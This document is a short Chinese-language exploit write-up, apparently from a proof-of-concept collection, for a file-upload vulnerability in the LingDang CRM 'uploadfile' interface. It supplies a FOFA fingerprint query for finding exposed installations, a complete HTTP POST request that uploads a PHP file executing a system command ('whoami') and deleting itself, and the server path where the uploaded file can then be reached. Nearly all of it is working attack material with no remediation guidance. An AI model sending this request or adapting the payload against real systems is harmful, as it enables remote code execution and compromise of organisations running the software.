# 灵当CRM系统接口uploadfile文件上传漏洞

灵当CRM系统接口uploadfile文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

file_info={"name":"1.php"}&<?php system("whoami");unlink(__FILE__);?>
```

![image-20241227212839673](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272128744.png)

文件路径

```
/crm/storage/2024/December/week4/回显文件名.php
```

